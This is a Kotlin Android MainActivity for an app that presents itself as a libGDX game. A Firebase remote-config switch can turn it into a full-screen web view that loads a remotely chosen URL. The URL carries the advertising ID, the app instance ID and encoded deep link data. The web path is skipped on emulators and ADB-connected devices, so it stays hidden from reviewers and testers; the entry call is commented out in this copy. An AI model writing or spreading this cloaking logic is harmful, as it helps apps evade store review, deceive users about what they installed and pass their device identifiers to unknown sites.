package com.hlperki.pesgllra

import android.content.pm.ActivityInfo
import android.os.Bundle
import android.util.Base64
import androidx.annotation.ColorRes
import androidx.annotation.IdRes
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.navigation.NavController
import androidx.navigation.findNavController
import com.badlogic.gdx.backends.android.AndroidFragmentApplication
import com.facebook.applinks.AppLinkData
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.google.firebase.FirebaseApp
import com.google.firebase.analytics.FirebaseAnalytics
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import com.hlperki.pesgllra.databinding.ActivityMainBinding
import com.hlperki.pesgllra.util.DataStoreManager
import com.hlperki.pesgllra.util.Lottie
import com.hlperki.pesgllra.util.Once
import com.hlperki.pesgllra.util.internetConnection
import com.hlperki.pesgllra.util.isADB
import com.hlperki.pesgllra.util.isEmulator
import com.hlperki.pesgllra.util.log
import com.hlperki.pesgllra.web.WebFragment
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.channels.BufferOverflow
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.json.JSONObject
import kotlin.coroutines.resume
import kotlin.coroutines.suspendCoroutine
import kotlin.system.exitProcess

class MainActivity : AppCompatActivity(), AndroidFragmentApplication.Callbacks {

    companion object {
        const val WEB_ID = 1000
        var urlWEB       = ""

        val startFragmentID = MutableSharedFlow<Int>(replay = 1, onBufferOverflow = BufferOverflow.DROP_OLDEST)
    }

    private val coroutine = CoroutineScope(Dispatchers.Default)
    private val onceExit  = Once()

    private lateinit var binding      : ActivityMainBinding
    private lateinit var navController: NavController

    lateinit var lottie: Lottie

    val webViewFragment = WebFragment(this)


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        initialize()
        if (internetConnection().not()) lottie.showNotInternet()
        else {
            asyncCheckInternetConnection()
            lottie.showLoader()

            //checkDataStore()
             startFragmentID.tryEmit(R.id.libGDXFragment)

            coroutine.launch(Dispatchers.Main) {
                startFragmentID.collect { fragmentId ->
                    when (fragmentId) {
                        R.id.libGDXFragment -> {
                            webViewFragment.goneWebView()
                            setNavigationBarColor(R.color.black)
                            setStartDestination(fragmentId)
                            ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE
                        }
                        WEB_ID                 -> {
                            webViewFragment.showAndOpenUrl()
                            setNavigationBarColor(R.color.white)
                            ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                        }
                        else -> ActivityInfo.SCREEN_ORIENTATION_FULL_USER
                    }.also { requestedOrientation = it }
                }
            }
        }
    }

    override fun onResume() {
        super.onResume()
        webViewFragment.onResume()
    }

    override fun onPause() {
        webViewFragment.onPause()
        super.onPause()
    }

    override fun exit() {
        onceExit.once {
            log("exit")
            coroutine.launch(Dispatchers.Main) {
                finishAndRemoveTask()
                delay(100)
                exitProcess(0)
            }
        }
    }

    private fun initialize() {
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        navController = findNavController(R.id.nav_host_fragment)
        lottie = Lottie(binding)
        webViewFragment.onCreate(coroutine, binding.web)
    }

    // ---------------------------------------------------
    // Logic
    // ---------------------------------------------------

    private fun asyncCheckInternetConnection() {
        coroutine.launch(Dispatchers.Main) {
            while (isActive) {
                delay(1_500)
                if (internetConnection()) lottie.hideNotInternet() else lottie.showNotInternet()
            }
        }
    }

    private fun setStartDestination(@IdRes destinationId: Int) {
        navController.run { navInflater.inflate(R.navigation.nav_graph).apply { setStartDestination(destinationId) }.also { setGraph(it, null) } }
    }

    fun setNavigationBarColor(@ColorRes colorId: Int) {
        coroutine.launch(Dispatchers.Main) {
            window.navigationBarColor = ContextCompat.getColor(this@MainActivity, colorId)
        }
    }

    private fun checkDataStore() {
        coroutine.launch(Dispatchers.IO) {
            when (DataStoreManager.Key.get()) {
                "Online" -> {
                    DataStoreManager.Link.get()?.let {
                        log("DataStoreManager Key = SUCCESS | link = $it")
                        urlWEB = it
                        startFragmentID.emit(WEB_ID)
                    }
                }
                "Ofline" -> {
                    log("DataStoreManager Key = GAME")
                    startFragmentID.emit(R.id.libGDXFragment)
                }
                else -> {
                    log("DataStoreManager Key = NONE")
                    getConfigData()
                }
            }
        }
    }

    private fun getConfigData() {
        FirebaseApp.initializeApp(appContext)

        Firebase.remoteConfig.apply {
            setConfigSettingsAsync(remoteConfigSettings { minimumFetchIntervalInSeconds = 3600 })
            fetchAndActivate().addOnCompleteListener(this@MainActivity) { task ->
                try {
                    if (task.isSuccessful) {
                        val jsonData = getString("Hell")
                        log("success = $jsonData")
                        JSONObject(jsonData).also { jsonObj ->
                            val pen    = jsonObj.getBoolean("pen")
                            val moment = jsonObj.getString("moment")

                            checkParams(pen, moment)
                        }
                    } else {
                        startFragmentID.tryEmit(R.id.libGDXFragment)
                        log("getFirebaseData Fail = ${this.all}")
                    }
                } catch (e: Exception) {
                    startFragmentID.tryEmit(R.id.libGDXFragment)
                    log("EXCEPTION getFirebaseData try catch = ${e.message}")
                }
            }
        }
    }

    private fun checkParams(pen: Boolean, moment: String) {
        if (pen) {
            // Web
            if (isADB() || isEmulator) ofline() else online(moment)
        } else {
            // Game
            ofline()
        }
    }

    private fun ofline() {
        coroutine.launch(Dispatchers.IO) {
            DataStoreManager.Key.update { "Ofline" }
            startFragmentID.tryEmit(R.id.libGDXFragment)
        }
    }

    private fun online(moment: String) {
        coroutine.launch(Dispatchers.Default) {
            val advertisingId = AdvertisingIdClient.getAdvertisingIdInfo(appContext).id

            urlWEB = moment + "?" +
                    "appInstanceId=${getAppInstanceId()}&" +
                    "advertisingId=${advertisingId}&" +
                    "fbData=${getDeepLink()}&" +
                    "dlData=${intent?.data?.toString()}"

            log("url - $urlWEB")

            startFragmentID.tryEmit(WEB_ID)

            withContext(Dispatchers.IO) {
                DataStoreManager.Key.update { "Online" }
                DataStoreManager.Link.update { urlWEB }
            }
        }
    }

    private suspend fun getDeepLink() = suspendCoroutine<String> { continuation ->
        AppLinkData.fetchDeferredAppLinkData(this) { applinkData ->
            val deep = applinkData?.targetUri?.toString()
            if (deep != null) {
                val data = deep.toByteArray()
                val fbData = Base64.encodeToString(data, Base64.DEFAULT)
                continuation.resume(fbData)
            } else continuation.resume("null")
        }
    }

    private suspend fun getAppInstanceId() = suspendCoroutine<String> { continuation ->
        FirebaseAnalytics.getInstance(this).appInstanceId
            .addOnSuccessListener { appInstanceIdResult ->
                log("getAppInstanceId good: $appInstanceIdResult")
                continuation.resume(appInstanceIdResult)
            }.addOnFailureListener { exception ->
                log("getAppInstanceId fail: $exception")
                continuation.resume("null")
            }
    }

}